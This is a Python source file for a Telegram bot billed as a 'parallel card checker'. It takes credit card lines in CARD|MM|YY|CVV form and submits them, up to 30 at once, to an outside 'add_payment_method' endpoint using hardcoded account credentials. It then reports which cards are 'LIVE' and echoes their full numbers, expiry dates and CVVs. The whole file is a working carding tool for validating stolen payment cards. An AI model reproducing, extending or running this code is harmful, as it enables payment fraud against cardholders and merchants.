import os
import re
import aiohttp
import asyncio
import urllib.parse
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from typing import List, Dict, Any

# Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BASE_API_URL = "https://andul-1.onrender.com/add_payment_method"
EMAIL = "sogaged371@hudisk.com"
PASSWORD = "sogaged371@"

# Bank database
BANK_DATABASE = {
    "4": {"brand": "VISA", "country": "USA"},
    "5": {"brand": "MASTERCARD", "country": "USA"},
    "34": {"brand": "AMEX", "country": "USA"},
    "37": {"brand": "AMEX", "country": "USA"},
    "6": {"brand": "DISCOVER", "country": "USA"},
}

def parse_card_line(line: str) -> Dict[str, Any]:
    """Parse card line."""
    match = re.match(r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', line.strip())
    if not match:
        return None
    
    card_number = match.group(1)
    month = match.group(2).zfill(2)
    year_input = match.group(3)
    cvv = match.group(4)
    
    year_api = year_input[-2:] if len(year_input) == 4 else year_input
    year_full = "20" + year_api if len(year_api) == 2 else year_input
    
    return {
        "card_number": card_number,
        "month": month,
        "year": year_api,
        "year_full": year_full,
        "cvv": cvv,
        "bin": card_number[:6],
        "last4": card_number[-4:],
        "line": line.strip()
    }

async def check_single_card(session: aiohttp.ClientSession, card_info: Dict[str, Any]) -> Dict[str, Any]:
    """Check a single card via API (async)."""
    try:
        card_string = f"{card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
        encoded_card = urllib.parse.quote(card_string, safe='')
        api_url = f"{BASE_API_URL}/{EMAIL}/{PASSWORD}/{encoded_card}"
        
        async with session.get(api_url, timeout=45) as response:
            text = await response.text()
            
            # Determine status
            status, message = get_card_status(text)
            
            # Get brand
            bin_num = card_info['bin']
            brand_info = BANK_DATABASE.get(bin_num[0], {"brand": "UNKNOWN", "country": "UNKNOWN"})
            
            return {
                "card": f"{card_info['bin']}...{card_info['last4']}",
                "full_card": card_info['card_number'],
                "exp": f"{card_info['month']}/{card_info['year_full']}",
                "cvv": card_info['cvv'],
                "status": status,
                "message": message,
                "brand": brand_info["brand"],
                "country": brand_info["country"],
                "is_live": "✅" in status,
                "raw": card_info['line'],
                "response": text[:100]
            }
            
    except asyncio.TimeoutError:
        return {
            "card": f"{card_info['bin']}...{card_info['last4']}",
            "full_card": card_info['card_number'],
            "exp": f"{card_info['month']}/{card_info['year_full']}",
            "cvv": card_info['cvv'],
            "status": "❌ TIMEOUT",
            "message": "45s timeout",
            "brand": "UNKNOWN",
            "country": "UNKNOWN",
            "is_live": False,
            "raw": card_info['line'],
            "response": "Timeout"
        }
    except Exception as e:
        return {
            "card": f"{card_info['bin']}...{card_info['last4']}",
            "full_card": card_info['card_number'],
            "exp": f"{card_info['month']}/{card_info['year_full']}",
            "cvv": card_info['cvv'],
            "status": "❌ ERROR",
            "message": str(e)[:50],
            "brand": "UNKNOWN",
            "country": "UNKNOWN",
            "is_live": False,
            "raw": card_info['line'],
            "response": "Error"
        }

def get_card_status(response_text: str) -> tuple:
    """Get card status from API response."""
    if not response_text:
        return "❌ NO RESPONSE", "No response"
    
    text = response_text.lower().strip()
    
    # LIVE indicators
    live_keywords = [
        "payment method added",
        "payment added", 
        "added successfully",
        "successfully added",
        "approved",
        "success"
    ]
    
    for keyword in live_keywords:
        if keyword in text:
            return "✅ LIVE", "Payment added"
    
    # DEAD indicators
    dead_keywords = [
        "card declined",
        "your card was declined",
        "card number is incorrect",
        "invalid card",
        "insufficient funds",
        "expired card",
        "incorrect cvc",
        "stripe pm creation failed"
    ]
    
    for keyword in dead_keywords:
        if keyword in text:
            return "❌ DECLINED", keyword.title()
    
    # If short response and not error, assume LIVE
    if len(text) < 100 and "error" not in text:
        return "✅ LIVE", "Success"
    
    return "⚠️ UNKNOWN", text[:50]

async def check_all_cards_at_once(cards: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Check ALL cards at the SAME TIME (parallel)."""
    # Create a session for all requests
    connector = aiohttp.TCPConnector(limit=50)  # Allow 50 concurrent connections
    timeout = aiohttp.ClientTimeout(total=60)  # 60 seconds total timeout
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Create tasks for ALL cards
        tasks = [check_single_card(session, card) for card in cards]
        
        # Run ALL tasks concurrently
        print(f"🚀 Starting parallel check for {len(cards)} cards...")
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        valid_results = []
        for i, result in enumerate(results):
            if isinstance(result, dict):
                valid_results.append(result)
            else:
                # Create error result for failed checks
                card = cards[i]
                valid_results.append({
                    "card": f"{card['bin']}...{card['last4']}",
                    "full_card": card['card_number'],
                    "exp": f"{card['month']}/{card['year_full']}",
                    "cvv": card['cvv'],
                    "status": "❌ ERROR",
                    "message": str(result)[:50],
                    "brand": "UNKNOWN",
                    "country": "UNKNOWN",
                    "is_live": False,
                    "raw": card['line'],
                    "response": "Check failed"
                })
        
        return valid_results

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    await update.message.reply_text(
        "⚡ *PARALLEL CARD CHECKER*\n\n"
        "*Check ALL cards at SAME TIME!*\n\n"
        "*Single Check:*\n"
        "`/chk 5328544152353125|12|28|923`\n\n"
        "*Mass Check (1-30 cards):*\n"
        "`/mass` then send cards\n"
        "*All cards checked simultaneously*\n\n"
        "*Format:*\n"
        "`CARD|MM|YY|CVV`",
        parse_mode='Markdown'
    )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle single card check."""
    if not context.args:
        await update.message.reply_text("❌ Use: `/chk CARD|MM|YY|CVV`", parse_mode='Markdown')
        return
    
    user_input = " ".join(context.args)
    card_info = parse_card_line(user_input)
    
    if not card_info:
        await update.message.reply_text("❌ Wrong format!")
        return
    
    msg = await update.message.reply_text(f"🔍 Checking...")
    
    # Check single card
    connector = aiohttp.TCPConnector()
    timeout = aiohttp.ClientTimeout(total=45)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        result = await check_single_card(session, card_info)
    
    # Format response
    response = f"💳 *CARD:* `{result['card']}`\n"
    response += f"📅 *EXP:* {result['exp']} | *CVV:* {result['cvv']}\n"
    response += f"🏷️ *BRAND:* {result['brand']}\n"
    response += "─" * 30 + "\n"
    response += f"*STATUS:* {result['status']}\n"
    response += f"*MESSAGE:* {result['message']}\n"
    
    if result['is_live']:
        response += "─" * 30 + "\n"
        response += "🎯 *LIVE CARD!*\n"
        response += f"`{result['full_card']}|{result['exp'].replace('/', '|')}|{result['cvv']}`\n"
    
    await msg.edit_text(response, parse_mode='Markdown')

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start mass checking."""
    context.user_data['mass_cards'] = []
    context.user_data['mass_mode'] = True
    
    await update.message.reply_text(
        "🚀 *PARALLEL MASS CHECK*\n\n"
        "*All cards checked AT ONCE!*\n"
        "• Max 30 cards\n"
        "• All checked simultaneously\n"
        "• Fast results (1-2 minutes)\n\n"
        "Send cards (1-30), one per line:\n"
        "Example:\n"
        "`5328544152353125|12|28|923`\n"
        "`4111111111111111|12|25|123`\n\n"
        "Then send `/done`",
        parse_mode='Markdown'
    )

async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process mass cards."""
    if 'mass_cards' not in context.user_data or not context.user_data['mass_cards']:
        await update.message.reply_text("❌ No cards!")
        context.user_data['mass_mode'] = False
        return
    
    cards = context.user_data['mass_cards']
    
    if len(cards) > 30:
        await update.message.reply_text(f"❌ Max 30! You sent {len(cards)}")
        context.user_data['mass_mode'] = False
        return
    
    await process_mass_parallel(update, cards)

async def process_mass_parallel(update: Update, cards: List[Dict[str, Any]]):
    """Process ALL cards in PARALLEL."""
    total = len(cards)
    
    # Show starting message
    msg = await update.message.reply_text(
        f"🚀 *PARALLEL CHECK STARTED*\n"
        f"📊 Cards: {total}\n"
        f"⚡ Checking ALL cards simultaneously...\n"
        f"⏱️ Estimated time: 1-2 minutes",
        parse_mode='Markdown'
    )
    
    # Check ALL cards at once
    start_time = asyncio.get_event_loop().time()
    results = await check_all_cards_at_once(cards)
    elapsed_time = asyncio.get_event_loop().time() - start_time
    
    # Analyze results
    live_cards = [r for r in results if r['is_live']]
    dead_cards = [r for r in results if not r['is_live']]
    
    # Build summary
    summary = f"📊 *PARALLEL CHECK COMPLETE*\n"
    summary += "─" * 35 + "\n"
    summary += f"✅ *LIVE CARDS:* {len(live_cards)}\n"
    summary += f"❌ *DEAD CARDS:* {len(dead_cards)}\n"
    summary += f"📁 *TOTAL CHECKED:* {total}\n"
    summary += f"⏱️ *TIME TAKEN:* {elapsed_time:.1f} seconds\n"
    summary += "─" * 35 + "\n\n"
    
    # Show LIVE cards
    if live_cards:
        summary += "🎯 *LIVE CARDS FOUND:*\n\n"
        for i, card in enumerate(live_cards[:10], 1):  # Show first 10 live cards
            summary += f"{i}. `{card['full_card']}|{card['exp'].replace('/', '|')}|{card['cvv']}`\n"
            summary += f"   {card['brand']} | {card['exp']} | {card['cvv']}\n\n"
        
        if len(live_cards) > 10:
            summary += f"... and {len(live_cards) - 10} more live cards\n\n"
    
    # Show dead cards summary
    if dead_cards:
        summary += f"❌ *DEAD CARDS:* {len(dead_cards)}\n"
        
        # Count by status
        status_count = {}
        for card in dead_cards:
            status = card['status']
            status_count[status] = status_count.get(status, 0) + 1
        
        for status, count in status_count.items():
            summary += f"   {status}: {count}\n"
    
    # Send results
    if len(summary) > 4000:
        # Split message
        parts = []
        current = ""
        for line in summary.split('\n'):
            if len(current) + len(line) + 1 < 4000:
                current += line + "\n"
            else:
                parts.append(current)
                current = line + "\n"
        if current:
            parts.append(current)
        
        # Send first part
        await msg.edit_text(parts[0], parse_mode='Markdown')
        
        # Send remaining parts
        for part in parts[1:]:
            if part.strip():
                await update.message.reply_text(part, parse_mode='Markdown')
    else:
        await msg.edit_text(summary, parse_mode='Markdown')
    
    # Clean up
    context.user_data['mass_mode'] = False
    if 'mass_cards' in context.user_data:
        del context.user_data['mass_cards']

async def handle_mass_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass card input."""
    if not context.user_data.get('mass_mode', False):
        return
    
    text = update.message.text.strip()
    lines = text.split('\n')
    
    valid_cards = []
    
    for line in lines:
        card = parse_card_line(line)
        if card:
            valid_cards.append(card)
    
    if 'mass_cards' not in context.user_data:
        context.user_data['mass_cards'] = []
    
    context.user_data['mass_cards'].extend(valid_cards)
    total = len(context.user_data['mass_cards'])
    
    await update.message.reply_text(f"✅ Added {len(valid_cards)} cards | Total: {total}/30")

async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct card input."""
    if context.user_data.get('mass_mode', False):
        await handle_mass_input(update, context)
        return
    
    text = update.message.text.strip()
    if re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', text):
        await chk_command(update, ContextTypes.DEFAULT_TYPE)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel mass check."""
    if 'mass_mode' in context.user_data:
        context.user_data['mass_mode'] = False
        if 'mass_cards' in context.user_data:
            del context.user_data['mass_cards']
        await update.message.reply_text("❌ Cancelled")

async def test_parallel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test parallel checking."""
    test_cards = [
        "4242424242424242|12|2025|123",  # Test card 1
        "4000000000000002|12|2025|123",  # Test card 2
        "5555555555554444|12|2026|123",  # Test card 3
    ]
    
    cards = [parse_card_line(card) for card in test_cards if parse_card_line(card)]
    
    msg = await update.message.reply_text("🧪 Testing parallel checking...")
    
    results = await check_all_cards_at_once(cards)
    
    response = "🧪 *PARALLEL TEST RESULTS*\n"
    response += "─" * 30 + "\n"
    
    for result in results:
        response += f"Card: {result['card']}\n"
        response += f"Status: {result['status']}\n"
        response += f"Message: {result['message']}\n"
        response += "─" * 30 + "\n"
    
    await msg.edit_text(response, parse_mode='Markdown')

def main():
    """Start the bot."""
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set TELEGRAM_BOT_TOKEN environment variable")
        return
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("check", chk_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("done", done_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(CommandHandler("test", test_parallel))
    
    # Handlers
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\.chk\s+'), chk_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_card))
    
    print("🚀 PARALLEL CARD CHECKER BOT")
    print("=" * 60)
    print("Features:")
    print("  • Checks ALL cards SIMULTANEOUSLY")
    print("  • Max 30 cards at once")
    print("  • Fast parallel processing")
    print("\nCommands:")
    print("  /chk <card> - Single check")
    print("  /mass - Parallel mass check (1-30 cards)")
    print("  /test - Test parallel checking")
    print("=" * 60)
    
    app.run_polling()

if __name__ == '__main__':
    main()
